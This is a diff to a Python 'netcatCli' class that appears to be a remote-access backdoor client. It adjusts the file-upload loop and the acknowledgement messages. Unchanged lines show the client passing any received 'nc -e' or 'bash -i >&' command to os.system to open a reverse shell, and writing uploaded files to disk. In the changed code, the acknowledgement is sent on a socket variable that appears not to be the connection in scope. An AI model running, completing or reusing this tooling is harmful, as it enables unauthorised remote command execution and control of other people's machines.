@@ -86,7 +86,6 @@ class netcatCli(object):
                 if ";" in filename:
                     filename = filename.replace(";",'.')
                 self.download(s,filename)
-                s.send(b"UPLOADED !")
             elif 'nc -e' in recv or 'bash -i >&' in recv:
                 os.system(recv)
                 s.send(b"\n[*] OPEN NEW SHELL\n")
@@ -107,17 +106,17 @@ class netcatCli(object):
             content = conn.recv(bufferSize).decode()
             f.write(content)
             fini = "false"
-            while fini == "false":
-                content = conn.recv(bufferSize).decode()
-                time.sleep(1)
-                f.write(content)
-                if len(content) < bufferSize:
-                    fini = "true"
+            if len(content) >= bufferSize:
+                while fini == "false":
+                    content = conn.recv(bufferSize).decode()
+                    time.sleep(1)
+                    f.write(content)
+                    if len(content) < bufferSize:
+                        fini = "true"
             f.close()
+            s.send(b"UPLOADED !")
         except PermissionError:
-            print("PermissionError")
-
-
+            conn.send(b"you can\'t upload here ! ")
 if __name__ == "__main__":
    ncat = netcatCli()
    ncat.main()
